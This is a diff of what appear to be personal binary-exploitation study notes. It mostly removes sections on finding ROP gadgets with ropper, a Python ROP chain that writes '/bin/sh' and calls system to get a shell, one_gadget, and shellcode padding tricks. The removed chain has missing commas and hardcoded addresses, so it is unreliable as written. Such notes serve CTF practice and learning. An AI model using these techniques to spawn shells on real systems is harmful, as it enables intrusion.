@@ -25,6 +25,7 @@ Keywords=IDA
 - dump binary with:
 ```
 objdump -M intel -d ./my_binary
+objdump -M intel -D ./vuln
 ```
 
 
@@ -313,43 +314,6 @@ man 2 open
 - https://treeniks.github.io/x86-64-simplified/prefix.html
 
 
-## find ROP gadgets
-- https://github.com/sashs/Ropper
-- install ropper
-```
-sudo pip install capstone
-sudo pip install filebytes
-sudo pip install keystone-engine
-pip install ropper
-```
-- find gadgets
-```
-ropper --file ./vuln
-ropper --file ./vuln --search syscall
-ropper --file ./vuln --inst-count 2 --type rop
-ropper --file ./vuln --search "mov rdi, e?x" --inst-count 2 --type rop
-
-ropper --file ./vuln --search "pop rdi; ret;" 
-
-ropper --file ./vuln --semantic "rdi+=rax"
-```
-- find all gadgets interactively
-```
-ropper
-file vuln
-```
-- exclude stuff
-```
-badbytes 0a
-```
-- find specific ones
-```
-search /1/ pop rdi
-```
-- find gadgets with ropper
-```
-search pop %; mov rdi, [rsp + %]; mov rax, [rsp + %];
-```
 
 # extract linker to run other libc locally
 - get container id
@@ -380,26 +344,6 @@ LD_DEBUG=libs ./vuln_patched
 sudo cat /proc/sys/vm/mmap_rnd_bits
 ```
 
-
-# ROP chain trick if PIE-disabled
-- if pie is off, we can write into "data" with the ropchain, then we can read from this well known address
-```python
-chain = b''.join([
-	pwn.p64(0x4013d5), # pop rdi; ret;
-	pwn.p64(0x48a000), # => rdi = "/bin/sh";
-	pwn.p64(0x401001), # pop rax; ret;
-	b'/bin/sh\0'
-	pwn.p64(0x442b30) # mov [rdi], rax; ret;
-	pwn.p64(binary.symbols['system'])
-])
-```
-
-
-# One_gadget
-- install
-```
-sudo gem install one_gadget
-```
 
 
 # IDA
@@ -467,23 +411,7 @@ got -p libc
 objdump -t ./vuln | c++filt | grep vtable
 ```
 
-## shellcode with junk
-- push stuff
-```
-push rax
-```
-- push 2 bytes
-```
-pushw 0x1122;
-```
-- add a short jump, jump over trash
-```
-jmp $+4
-```
-- multi byte nop (this ignores 4 bytes)
-```
-nop DWORD PTR [RAX - 0x48];
-```
+
 
 ## python virtual environment
 ```
